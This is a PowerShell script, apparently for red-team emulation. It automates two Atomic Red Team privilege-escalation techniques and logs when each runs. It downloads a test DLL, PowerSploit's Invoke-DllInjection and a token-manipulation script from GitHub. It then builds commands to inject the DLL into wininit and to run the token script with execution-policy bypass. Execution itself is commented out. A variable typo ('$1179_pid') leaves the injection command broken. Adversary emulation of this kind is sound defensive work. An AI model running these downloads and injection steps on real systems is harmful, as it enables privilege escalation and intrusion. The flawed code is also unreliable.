<# 

The commands in this script include atomic red team TTPs. This script is meant to automate execution of TTPs as well as make it reproducible 
along with generating a log file that notes down the time at which it was executed.parameters can be replaced with appropriate binaries suitable for yor
environment 

#>

$currentdir = $(pwd).Path
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$T1179_dll = "$currentdir\T1179.dll"

$T1179_malicious_dll_download="https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1179/src/x64/T1179.dll"
[Int32]$T1179_pid=$(Get-Process -Name wininit).Id

Invoke-WebRequest -Uri $T1179_malicious_dll_download -Outfile $T1179_dll

$PRIVESCLOGO = 
'
############################################################################################################################################################################################################### 
#                                                                                                                                                                                                              #   
#                                                                                     PRIVILEGE ESCALATION                                                                                                     #   
#                                                                                                                                                                                                              #
################################################################################################################################################################################################################
'

Write-Host $PRIVESCLOGO


$T1055_ps1 = "$currentdir\T1055.ps1"
$T1134_ps1 = "$currentdir\T1134.ps1"

$T1055_invoke_dll_injection_download = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1"
$T1134_access_token_download = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1134/src/T1134.ps1"

Invoke-WebRequest -Uri $T1055_invoke_dll_injection_download -OutFile $T1055_ps1
Invoke-WebRequest -Uri $T1134_access_token_download         -OutFile $T1134_ps1
    

$T1055 = 'Import-Module ' + $T1055_ps1 + ' ; Invoke-DllInjection -ProcessID ' + $1179_pid +' -Dll ' + $T1179_dll
$T1134 = 'powershell.exe -exec bypass ' + $T1134_ps1

[array]$privesc_TTP_number = "T1055","T1134"
[array]$privesc = $T1055, $T1134


for ($i=0; $i -lt $privesc.length; $i++){
    
    Write-Host Exeucting $privesc_TTP_number[$i] -ForegroundColor Red `n
    Write-Host $privesc[$i] -ForegroundColor green `n
    Write-Host Time : $(Get-Date) -ForegroundColor Cyan `n
    Write-Host -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    Get-Date | Add-Content log-privesc.txt 
    "                         " | Add-Content log-privesc.txt
    $privesc_TTP_number[$i]+ " : " + $privesc[$i] | Add-Content log-privesc.txt
    "                         " | Add-Content log-privesc.txt
    <# Invoke-Expression $privesc[$i] #>
    "---------------------------------------------------------------------------------------------------------------------------" | Add-Content log-privesc.txt 

} 


